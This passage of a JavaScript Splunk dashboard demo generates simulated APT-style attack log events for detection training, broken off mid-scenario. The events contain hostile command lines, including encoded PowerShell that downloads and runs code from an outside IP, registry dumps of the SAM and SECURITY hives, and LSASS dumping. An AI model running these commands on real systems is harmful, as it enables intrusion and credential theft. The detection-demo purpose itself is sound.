// ============================================================================
// DEMO DATA STREAMER - Multi-scenario attack replay event generator
// SA-attack-replay - Splunk Community Dashboard Contest 2026
//
// Streams 3 distinct scenarios into index=sa_attack_sim with CORRECT native
// sourcetypes preserved at index time (events are grouped per sourcetype and
// each group is `| collect`-ed with its own sourcetype= argument). This is
// what lets eventtypes.conf + tags.conf wire events into CIM data models.
//
// Scenarios:
//   op_midnight_eclipse - APT-29 espionage (6 phases, ~80 events)
//   op_ironclaw         - Ransomware (5 phases, ~65 events)
//   op_silent_drift     - Insider data theft (4 phases, ~50 events)
//
// Every event MUST emit:
//   _time_offset, host, sourcetype, mitre_technique, mitre_tactic,
//   severity, kill_chain_phase, risk_score, description, scenario_id
// Plus sourcetype-specific CIM fields (src_ip, dest_ip, user, dest_host,
// target_filename, command_line, etc).
// ============================================================================

define([
    'jquery',
    'splunkjs/mvc'
], function($, mvc) {
    'use strict';

    var service = mvc.createService();
    var DEMO_INDEX = 'sa_attack_sim';
    var SUMMARY_INDEX = 'summary_sa_attack_replay';
    // Scale factor applied to each event's _time_offset when writing to the
    // INDEX (not the display). Long scenarios (e.g. the 21-day Stillwater) set
    // index_span_seconds so their indexed copy compresses into a recent window
    // and the -24h dashboard panels still populate, while the topology/clock
    // replay the true multi-week narrative from the raw _time_offset values.
    var _indexCompress = 1;

    // ========================================================================
    // SCENARIO DEFINITIONS - keyed by id
    // ========================================================================

    var scenarios = {

        // ====================================================================
        // op_midnight_eclipse - APT-29 Espionage
        // 6 phases, ~80 events, simulated ~1h, target playback 90s
        // ====================================================================
        op_midnight_eclipse: {
            id: 'op_midnight_eclipse',
            attacker_thoughts: [
                { _time_offset: 8, text: 'Hooked them with the macro. Time to phone home.' },
                { _time_offset: 480, text: 'LSASS dumped. Got jsmith hash + two service accounts. Beautiful.' },
                { _time_offset: 840, text: 'SMB hop to SRV-FILE01 worked on first try. Their "MFA" is laughable.' },
                { _time_offset: 1860, text: 'SSH key works on the web server. Whoever generated this never rotated it.' },
                { _time_offset: 2700, text: 'DCSync on DC01. They have no replication alerting. I\'m domain admin now.' },
                { _time_offset: 3120, text: 'Golden ticket forged. krbtgt is mine until they rotate twice. They won\'t.' },
                { _time_offset: 3600, text: '2.3GB customer database staged. HTTPS POST in 12 chunks. Done.' }
            ],
            name: 'Operation Midnight Eclipse',
            subtitle: 'APT-29 espionage chain targeting financial services',
            description: 'A multi-week APT-29 style operation: spear-phished macro launches encoded PowerShell on a finance analyst workstation, establishes C2, harvests credentials, pivots laterally to file/web/DB/Exchange/DC servers, forges a Golden Ticket, and exfiltrates 2.3 GB of customer records and executive mailbox archives over HTTPS and DNS.',
            duration_label: '~1h simulated',
            real_world: 'multi-week (APT dwell)',
            target_playback_seconds: 90,
            phases: [
                // ============================================================
                // Phase 1 - Initial Access (T+0 to T+5min) -- ~12 events
                // ============================================================
                {
                    id: 'initial_access',
                    label: 'Initial Access',
                    delay: 0,
                    transition_text: 'INITIAL ACCESS',
                    events: [
                        { _time_offset: 0, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Security', EventCode: 4688, src_user: 'jsmith', user: 'jsmith', process: 'WINWORD.EXE', process_name: 'WINWORD.EXE', parent_process: 'explorer.exe', parent_process_name: 'explorer.exe', command_line: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\jsmith\\Downloads\\Q4_Financial_Review.docm"', mitre_technique: 'T1204.002', mitre_tactic: 'Execution', severity: 'high', description: 'User opened malicious macro-enabled document Q4_Financial_Review.docm', kill_chain_phase: 'initial_access', risk_score: 60, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Security', EventCode: 4688, src_user: 'jsmith', user: 'jsmith', process: 'powershell.exe', process_name: 'powershell.exe', parent_process: 'WINWORD.EXE', parent_process_name: 'WINWORD.EXE', command_line: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADIALwBzAHQAYQBnAGUAMgAnACkA', mitre_technique: 'T1059.001', mitre_tactic: 'Execution', severity: 'critical', description: 'Encoded PowerShell child of WINWORD.EXE (T1059.001 + T1027 obfuscation)', kill_chain_phase: 'execution', risk_score: 85, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 4, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'jsmith', user: 'jsmith', process: 'powershell.exe', process_name: 'powershell.exe', parent_process: 'WINWORD.EXE', parent_process_name: 'WINWORD.EXE', command_line: 'powershell -nop -w hidden -enc ...', file_hash: '5d41402abc4b2a76b9719d911017c592', mitre_technique: 'T1059.001', mitre_tactic: 'Execution', severity: 'critical', description: 'Sysmon process create: obfuscated PowerShell from Office parent', kill_chain_phase: 'execution', risk_score: 85, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 5, host: 'WS-JSMITH', sourcetype: 'stream:http', src_ip: '10.1.2.45', src: '10.1.2.45', dest_ip: '185.220.101.42', dest: '185.220.101.42', dest_port: 443, dest_host: 'update-cdn-services.com', site: 'update-cdn-services.com', http_method: 'GET', url: 'https://update-cdn-services.com/stage2', uri_path: '/stage2', bytes_out: 245, bytes_in: 184320, bytes: 184565, status: 200, app: 'https', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', severity: 'critical', description: 'HTTPS beacon to C2 (update-cdn-services.com / 185.220.101.42)', kill_chain_phase: 'c2', risk_score: 90, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 8, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'jsmith', user: 'jsmith', process: 'svchost_update.exe', process_name: 'svchost_update.exe', parent_process: 'powershell.exe', parent_process_name: 'powershell.exe', command_line: 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost_update.exe', file_hash: 'e99a18c428cb38d5f260853678922e03', mitre_technique: 'T1036.005', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'Masqueraded binary svchost_update.exe dropped to %TEMP% and executed', kill_chain_phase: 'execution', risk_score: 75, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 10, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'jsmith', user: 'jsmith', process: 'powershell.exe', process_name: 'powershell.exe', target_filename: 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost_update.exe', file_name: 'svchost_update.exe', file_path: 'C:\\Users\\jsmith\\AppData\\Local\\Temp', mitre_technique: 'T1105', mitre_tactic: 'Command and Control', severity: 'high', description: 'Sysmon file create: dropper written to %TEMP%', kill_chain_phase: 'execution', risk_score: 70, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 30, host: 'WS-JSMITH', sourcetype: 'stream:http', src_ip: '10.1.2.45', src: '10.1.2.45', dest_ip: '185.220.101.42', dest: '185.220.101.42', dest_port: 443, dest_host: 'update-cdn-services.com', site: 'update-cdn-services.com', http_method: 'POST', url: 'https://update-cdn-services.com/beacon', uri_path: '/beacon', bytes_out: 512, bytes_in: 1024, bytes: 1536, status: 200, app: 'https', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', severity: 'high', description: 'C2 beacon check-in (interval 30s)', kill_chain_phase: 'c2', risk_score: 80, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 60, host: 'WS-JSMITH', sourcetype: 'stream:http', src_ip: '10.1.2.45', src: '10.1.2.45', dest_ip: '185.220.101.42', dest: '185.220.101.42', dest_port: 443, dest_host: 'update-cdn-services.com', site: 'update-cdn-services.com', http_method: 'POST', url: 'https://update-cdn-services.com/beacon', uri_path: '/beacon', bytes_out: 480, bytes_in: 980, bytes: 1460, status: 200, app: 'https', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', severity: 'medium', description: 'C2 beacon check-in', kill_chain_phase: 'c2', risk_score: 70, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 90, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'jsmith', user: 'jsmith', process: 'svchost_update.exe', process_name: 'svchost_update.exe', parent_process: 'powershell.exe', parent_process_name: 'powershell.exe', command_line: 'svchost_update.exe --recon', mitre_technique: 'T1057', mitre_tactic: 'Discovery', severity: 'medium', description: 'Dropper executed reconnaissance helpers', kill_chain_phase: 'discovery', risk_score: 55, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 120, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'jsmith', user: 'jsmith', process: 'whoami.exe', process_name: 'whoami.exe', parent_process: 'svchost_update.exe', parent_process_name: 'svchost_update.exe', command_line: 'whoami /all', mitre_technique: 'T1033', mitre_tactic: 'Discovery', severity: 'low', description: 'User context discovery (whoami /all)', kill_chain_phase: 'discovery', risk_score: 30, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 180, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'jsmith', user: 'jsmith', process: 'net.exe', process_name: 'net.exe', parent_process: 'svchost_update.exe', parent_process_name: 'svchost_update.exe', command_line: 'net group "Domain Admins" /domain', mitre_technique: 'T1069.002', mitre_tactic: 'Discovery', severity: 'medium', description: 'Domain group enumeration (Domain Admins)', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 240, host: 'WS-JSMITH', sourcetype: 'stream:http', src_ip: '10.1.2.45', src: '10.1.2.45', dest_ip: '185.220.101.42', dest: '185.220.101.42', dest_port: 443, dest_host: 'update-cdn-services.com', site: 'update-cdn-services.com', http_method: 'POST', url: 'https://update-cdn-services.com/recon-results', uri_path: '/recon-results', bytes_out: 8192, bytes_in: 256, bytes: 8448, status: 200, app: 'https', mitre_technique: 'T1041', mitre_tactic: 'Exfiltration', severity: 'medium', description: 'Recon results returned to C2', kill_chain_phase: 'c2', risk_score: 55, scenario_id: 'op_midnight_eclipse' }
                    ]
                },
                // ============================================================
                // Phase 2 - Persistence & Credential Access (T+5 to T+10min) -- ~14
                // ============================================================
                {
                    id: 'persistence',
                    label: 'Persistence & Credential Access',
                    delay: 3,
                    transition_text: 'PERSISTENCE + CREDENTIAL ACCESS',
                    events: [
                        { _time_offset: 300, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Security', EventCode: 4698, src_user: 'SYSTEM', user: 'SYSTEM', task_name: '\\Microsoft\\Windows\\Update\\svchost_update', command_line: 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost_update.exe', mitre_technique: 'T1053.005', mitre_tactic: 'Persistence', severity: 'high', description: 'Scheduled task created masquerading as Windows Update', kill_chain_phase: 'persistence', risk_score: 70, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 310, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Security', EventCode: 1102, src_user: 'SYSTEM', user: 'SYSTEM', mitre_technique: 'T1070.001', mitre_tactic: 'Defense Evasion', severity: 'high', description: 'Security event log cleared by attacker', kill_chain_phase: 'defense_evasion', risk_score: 80, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 360, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 7, src_user: 'jsmith', user: 'jsmith', process: 'svchost_update.exe', process_name: 'svchost_update.exe', image_loaded: 'C:\\Windows\\System32\\samlib.dll', mitre_technique: 'T1003', mitre_tactic: 'Credential Access', severity: 'medium', description: 'samlib.dll loaded by non-system process (credential dumping prep)', kill_chain_phase: 'credential_access', risk_score: 60, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 365, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 7, src_user: 'jsmith', user: 'jsmith', process: 'svchost_update.exe', process_name: 'svchost_update.exe', image_loaded: 'C:\\Windows\\System32\\vaultcli.dll', mitre_technique: 'T1003', mitre_tactic: 'Credential Access', severity: 'medium', description: 'vaultcli.dll loaded (Windows Vault credential access)', kill_chain_phase: 'credential_access', risk_score: 60, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 420, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'jsmith', user: 'jsmith', process: 'reg.exe', process_name: 'reg.exe', parent_process: 'svchost_update.exe', parent_process_name: 'svchost_update.exe', command_line: 'reg save HKLM\\SAM C:\\Users\\jsmith\\AppData\\Local\\Temp\\sam.save', mitre_technique: 'T1003.002', mitre_tactic: 'Credential Access', severity: 'high', description: 'SAM hive saved to disk for offline cracking', kill_chain_phase: 'credential_access', risk_score: 85, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 425, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'jsmith', user: 'jsmith', process: 'reg.exe', process_name: 'reg.exe', parent_process: 'svchost_update.exe', parent_process_name: 'svchost_update.exe', command_line: 'reg save HKLM\\SECURITY C:\\Users\\jsmith\\AppData\\Local\\Temp\\sec.save', mitre_technique: 'T1003.004', mitre_tactic: 'Credential Access', severity: 'high', description: 'SECURITY hive saved to disk', kill_chain_phase: 'credential_access', risk_score: 85, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 480, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 10, src_user: 'SYSTEM', user: 'SYSTEM', process: 'svchost_update.exe', process_name: 'svchost_update.exe', source_process: 'svchost_update.exe', target_process: 'lsass.exe', granted_access: '0x1010', mitre_technique: 'T1003.001', mitre_tactic: 'Credential Access', severity: 'critical', description: 'LSASS memory access (granted_access 0x1010) - Mimikatz signature', kill_chain_phase: 'credential_access', risk_score: 95, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 482, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 10, src_user: 'SYSTEM', user: 'SYSTEM', process: 'svchost_update.exe', process_name: 'svchost_update.exe', source_process: 'svchost_update.exe', target_process: 'lsass.exe', granted_access: '0x1438', mitre_technique: 'T1003.001', mitre_tactic: 'Credential Access', severity: 'critical', description: 'LSASS handle with PROCESS_VM_READ (0x1438)', kill_chain_phase: 'credential_access', risk_score: 95, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 485, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'SYSTEM', user: 'SYSTEM', process: 'svchost_update.exe', process_name: 'svchost_update.exe', target_filename: 'C:\\Users\\jsmith\\AppData\\Local\\Temp\\lsass.dmp', file_name: 'lsass.dmp', file_path: 'C:\\Users\\jsmith\\AppData\\Local\\Temp', mitre_technique: 'T1003.001', mitre_tactic: 'Credential Access', severity: 'critical', description: 'LSASS memory dump written to disk', kill_chain_phase: 'credential_access', risk_score: 98, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 490, host: 'WS-JSMITH', sourcetype: 'attack_sim:creds', src_user: 'jsmith', user: 'jsmith', credentials_harvested: 'jsmith:NTLM_HASH,svc_backup:NTLM_HASH,svc_deploy:SSH_KEY,bsmith:NTLM_HASH', credential_count: 4, mitre_technique: 'T1003.001', mitre_tactic: 'Credential Access', severity: 'critical', description: 'Credentials extracted: jsmith, svc_backup, svc_deploy, bsmith', kill_chain_phase: 'credential_access', risk_score: 95, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 510, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Security', EventCode: 4625, src_ip: '10.1.2.45', src: '10.1.2.45', dest: 'WS-JSMITH', src_user: 'svc_backup', user: 'svc_backup', logon_type: 3, action: 'failure', mitre_technique: 'T1110', mitre_tactic: 'Credential Access', severity: 'low', description: 'Initial cred replay test failed (svc_backup local logon)', kill_chain_phase: 'credential_access', risk_score: 25, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 515, host: 'WS-JSMITH', sourcetype: 'WinEventLog:Security', EventCode: 4624, src_ip: '10.1.2.45', src: '10.1.2.45', dest: 'WS-JSMITH', src_user: 'svc_backup', user: 'svc_backup', logon_type: 9, action: 'success', mitre_technique: 'T1134', mitre_tactic: 'Privilege Escalation', severity: 'high', description: 'svc_backup token impersonated via runas /netonly', kill_chain_phase: 'privilege_escalation', risk_score: 75, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 560, host: 'WS-JSMITH', sourcetype: 'stream:http', src_ip: '10.1.2.45', src: '10.1.2.45', dest_ip: '185.220.101.42', dest: '185.220.101.42', dest_port: 443, dest_host: 'update-cdn-services.com', site: 'update-cdn-services.com', http_method: 'POST', url: 'https://update-cdn-services.com/creds', uri_path: '/creds', bytes_out: 16384, bytes_in: 256, bytes: 16640, status: 200, app: 'https', mitre_technique: 'T1041', mitre_tactic: 'Exfiltration', severity: 'high', description: 'Credentials exfiltrated to C2 (16 KB)', kill_chain_phase: 'exfiltration', risk_score: 80, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 590, host: 'WS-JSMITH', sourcetype: 'attack_sim:notable', src_user: 'jsmith', user: 'jsmith', mitre_technique: 'T1003.001', mitre_tactic: 'Credential Access', severity: 'critical', description: 'NOTABLE: Credential dumping confirmed on WS-JSMITH', kill_chain_phase: 'credential_access', risk_score: 95, scenario_id: 'op_midnight_eclipse' }
                    ]
                },
                // ============================================================
                // Phase 3 - Lateral Movement (T+14 to T+30min) -- ~15
                // ============================================================
                {
                    id: 'lateral_movement',
                    label: 'Lateral Movement',
                    delay: 3,
                    transition_text: 'LATERAL MOVEMENT',
                    events: [
                        { _time_offset: 840, host: 'SRV-FILE01', sourcetype: 'WinEventLog:Security', EventCode: 4624, src_ip: '10.1.2.45', src: '10.1.2.45', dest_ip: '10.1.10.20', dest: 'SRV-FILE01', src_user: 'svc_backup', user: 'svc_backup', logon_type: 3, action: 'success', mitre_technique: 'T1021.002', mitre_tactic: 'Lateral Movement', severity: 'critical', description: 'SMB/PsExec lateral movement to file server using svc_backup', kill_chain_phase: 'lateral_movement', risk_score: 85, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 845, host: 'SRV-FILE01', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'svc_backup', user: 'svc_backup', process: 'PSEXESVC.exe', process_name: 'PSEXESVC.exe', parent_process: 'services.exe', parent_process_name: 'services.exe', command_line: 'C:\\Windows\\PSEXESVC.exe', mitre_technique: 'T1569.002', mitre_tactic: 'Execution', severity: 'high', description: 'PsExec service started on SRV-FILE01', kill_chain_phase: 'lateral_movement', risk_score: 80, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 870, host: 'SRV-FILE01', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'svc_backup', user: 'svc_backup', process: 'cmd.exe', process_name: 'cmd.exe', parent_process: 'PSEXESVC.exe', parent_process_name: 'PSEXESVC.exe', command_line: 'cmd /c dir C:\\Shares\\Finance\\*.xlsx /S', mitre_technique: 'T1083', mitre_tactic: 'Discovery', severity: 'medium', description: 'File-share enumeration on SRV-FILE01', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 900, host: 'SRV-FILE01', sourcetype: 'stream:tcp', src_ip: '10.1.2.45', src: '10.1.2.45', dest_ip: '10.1.10.20', dest: '10.1.10.20', dest_port: 445, app: 'smb', bytes_out: 1024, bytes_in: 2048, bytes: 3072, mitre_technique: 'T1021.002', mitre_tactic: 'Lateral Movement', severity: 'medium', description: 'SMB session sustained for share browsing', kill_chain_phase: 'lateral_movement', risk_score: 50, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 1080, host: 'SRV-FILE01', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'svc_backup', user: 'svc_backup', process: 'cmd.exe', process_name: 'cmd.exe', target_filename: 'C:\\Shares\\staging$\\enum.csv', file_name: 'enum.csv', file_path: 'C:\\Shares\\staging$', mitre_technique: 'T1074.001', mitre_tactic: 'Collection', severity: 'medium', description: 'File-share enumeration output staged on SRV-FILE01', kill_chain_phase: 'collection', risk_score: 50, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 1320, host: 'WS-ANALYST01', sourcetype: 'WinEventLog:Security', EventCode: 4624, src_ip: '10.1.10.20', src: '10.1.10.20', dest_ip: '10.1.2.50', dest: 'WS-ANALYST01', src_user: 'jsmith', user: 'jsmith', logon_type: 10, action: 'success', mitre_technique: 'T1021.001', mitre_tactic: 'Lateral Movement', severity: 'high', description: 'RDP session from file server to analyst workstation', kill_chain_phase: 'lateral_movement', risk_score: 75, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 1340, host: 'WS-ANALYST01', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'jsmith', user: 'jsmith', process: 'mstsc.exe', process_name: 'mstsc.exe', parent_process: 'svchost.exe', parent_process_name: 'svchost.exe', command_line: 'mstsc.exe /v:10.1.2.50', mitre_technique: 'T1021.001', mitre_tactic: 'Lateral Movement', severity: 'medium', description: 'RDP client launched on hop', kill_chain_phase: 'lateral_movement', risk_score: 50, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 1500, host: 'WS-ANALYST01', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'jsmith', user: 'jsmith', process: 'explorer.exe', process_name: 'explorer.exe', parent_process: 'svchost.exe', parent_process_name: 'svchost.exe', command_line: 'explorer.exe \\\\SRV-FILE01\\Finance$', mitre_technique: 'T1083', mitre_tactic: 'Discovery', severity: 'low', description: 'Finance share browsed from analyst workstation', kill_chain_phase: 'discovery', risk_score: 35, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 1620, host: 'WS-ANALYST01', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'jsmith', user: 'jsmith', process: 'explorer.exe', process_name: 'explorer.exe', target_filename: 'C:\\Users\\jsmith\\Documents\\acme_clients_2024.xlsx', file_name: 'acme_clients_2024.xlsx', file_path: 'C:\\Users\\jsmith\\Documents', mitre_technique: 'T1005', mitre_tactic: 'Collection', severity: 'medium', description: 'Sensitive client list copied to analyst host', kill_chain_phase: 'collection', risk_score: 55, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 1860, host: 'SRV-WEB01', sourcetype: 'linux:auth', src_ip: '10.1.2.45', src: '10.1.2.45', dest_ip: '10.1.10.30', dest: 'SRV-WEB01', src_user: 'svc_deploy', user: 'svc_deploy', auth_method: 'publickey', action: 'success', mitre_technique: 'T1021.004', mitre_tactic: 'Lateral Movement', severity: 'high', description: 'SSH login using stolen svc_deploy key', kill_chain_phase: 'lateral_movement', risk_score: 80, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 1900, host: 'SRV-WEB01', sourcetype: 'linux:auth', src_ip: '10.1.2.45', src: '10.1.2.45', dest: 'SRV-WEB01', src_user: 'svc_deploy', user: 'svc_deploy', action: 'sudo', mitre_technique: 'T1548.003', mitre_tactic: 'Privilege Escalation', severity: 'high', description: 'sudo to root on SRV-WEB01', kill_chain_phase: 'privilege_escalation', risk_score: 75, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 1950, host: 'SRV-WEB01', sourcetype: 'stream:tcp', src_ip: '10.1.10.30', src: '10.1.10.30', dest_ip: '10.1.10.40', dest: '10.1.10.40', dest_port: 3306, app: 'mysql', bytes_out: 512, bytes_in: 256, bytes: 768, mitre_technique: 'T1021', mitre_tactic: 'Lateral Movement', severity: 'medium', description: 'MySQL connection from web server to database server', kill_chain_phase: 'lateral_movement', risk_score: 55, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2000, host: 'WS-JSMITH', sourcetype: 'stream:http', src_ip: '10.1.2.45', src: '10.1.2.45', dest_ip: '185.220.101.42', dest: '185.220.101.42', dest_port: 443, dest_host: 'update-cdn-services.com', site: 'update-cdn-services.com', http_method: 'POST', url: 'https://update-cdn-services.com/beacon', uri_path: '/beacon', bytes_out: 1024, bytes_in: 2048, bytes: 3072, status: 200, app: 'https', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', severity: 'medium', description: 'C2 beacon with lateral-movement results', kill_chain_phase: 'c2', risk_score: 65, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2100, host: 'SRV-FILE01', sourcetype: 'WinEventLog:Sysmon', EventCode: 3, src_ip: '10.1.10.20', src: '10.1.10.20', dest_ip: '10.1.10.40', dest: '10.1.10.40', dest_port: 1433, src_user: 'svc_backup', user: 'svc_backup', process: 'sqlcmd.exe', process_name: 'sqlcmd.exe', app: 'mssql', mitre_technique: 'T1021', mitre_tactic: 'Lateral Movement', severity: 'medium', description: 'sqlcmd connection from file server to DB host', kill_chain_phase: 'lateral_movement', risk_score: 55, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2200, host: 'SRV-DB01', sourcetype: 'WinEventLog:Security', EventCode: 4624, src_ip: '10.1.10.20', src: '10.1.10.20', dest: 'SRV-DB01', src_user: 'svc_backup', user: 'svc_backup', logon_type: 3, action: 'success', mitre_technique: 'T1021.002', mitre_tactic: 'Lateral Movement', severity: 'high', description: 'svc_backup network logon to SRV-DB01', kill_chain_phase: 'lateral_movement', risk_score: 75, scenario_id: 'op_midnight_eclipse' }
                    ]
                },
                // ============================================================
                // Phase 4 - Deeper Compromise (T+38 to T+50min) -- ~14
                // ============================================================
                {
                    id: 'collection',
                    label: 'Deeper Compromise',
                    delay: 3,
                    transition_text: 'COLLECTION + DOMAIN COMPROMISE',
                    events: [
                        { _time_offset: 2280, host: 'SRV-DB01', sourcetype: 'stream:mysql', src_ip: '10.1.10.30', src: '10.1.10.30', dest_ip: '10.1.10.40', dest: '10.1.10.40', dest_port: 3306, src_user: 'svc_deploy', user: 'svc_deploy', query: 'SELECT * FROM customer_data LIMIT 10000', database: 'production_crm', bytes_out: 256, bytes_in: 2097152, bytes: 2097408, app: 'mysql', mitre_technique: 'T1005', mitre_tactic: 'Collection', severity: 'critical', description: 'Database enumeration: 10K rows from customer_data', kill_chain_phase: 'collection', risk_score: 85, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2310, host: 'SRV-DB01', sourcetype: 'stream:mysql', src_ip: '10.1.10.30', src: '10.1.10.30', dest_ip: '10.1.10.40', dest: '10.1.10.40', dest_port: 3306, src_user: 'svc_deploy', user: 'svc_deploy', query: 'SELECT * FROM customer_pii', database: 'production_crm', bytes_out: 256, bytes_in: 26214400, bytes: 26214656, app: 'mysql', mitre_technique: 'T1005', mitre_tactic: 'Collection', severity: 'critical', description: '25 MB pulled from customer_pii table', kill_chain_phase: 'collection', risk_score: 90, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2400, host: 'SRV-DB01', sourcetype: 'stream:mysql', src_ip: '10.1.10.30', src: '10.1.10.30', dest_ip: '10.1.10.40', dest: '10.1.10.40', dest_port: 3306, src_user: 'svc_deploy', user: 'svc_deploy', query: 'SELECT * FROM transactions WHERE amount > 100000', database: 'production_crm', bytes_out: 256, bytes_in: 5242880, bytes: 5243136, app: 'mysql', mitre_technique: 'T1005', mitre_tactic: 'Collection', severity: 'critical', description: 'High-value transactions enumerated', kill_chain_phase: 'collection', risk_score: 88, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2520, host: 'SRV-DB01', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'svc_backup', user: 'svc_backup', process: 'sqlcmd.exe', process_name: 'sqlcmd.exe', target_filename: 'C:\\Users\\svc_backup\\AppData\\Local\\Temp\\crm_export.csv', file_name: 'crm_export.csv', file_path: 'C:\\Users\\svc_backup\\AppData\\Local\\Temp', mitre_technique: 'T1005', mitre_tactic: 'Collection', severity: 'high', description: 'CRM dump written to local temp', kill_chain_phase: 'collection', risk_score: 80, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2700, host: 'DC01', sourcetype: 'WinEventLog:Security', EventCode: 4662, src_ip: '10.1.2.45', src: '10.1.2.45', src_user: 'jsmith', user: 'jsmith', object_type: 'DS-Replication-Get-Changes-All', mitre_technique: 'T1003.006', mitre_tactic: 'Credential Access', severity: 'critical', description: 'DCSync attack: directory replication by non-DC account', kill_chain_phase: 'credential_access', risk_score: 100, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2705, host: 'DC01', sourcetype: 'WinEventLog:Security', EventCode: 4662, src_ip: '10.1.2.45', src: '10.1.2.45', src_user: 'jsmith', user: 'jsmith', object_type: 'DS-Replication-Get-Changes', mitre_technique: 'T1003.006', mitre_tactic: 'Credential Access', severity: 'critical', description: 'DCSync continuation: secondary replication call', kill_chain_phase: 'credential_access', risk_score: 100, scenario_id: 'op_midnight_eclipse' },
                        { _time_offset: 2710, host: 'DC01', sourcetype: 'WinEventLog:Security', EventCode: 4769, src_ip: '10.1.2.45', src: '10.1.2.45', src_user: 'jsmith', user: 'jsmith', service_name: 'krbtgt', ticket_options: '0x50800000', mitre_technique: 'T1558.001', mitre_tactic: 'Credential Access', severity: 'critical', description: 'Golden ticket forged using krbtgt hash', kill_chain_phase: 'privilege_escalation', risk_score: 100, scenario_id: 'op_midnight_eclipse' },
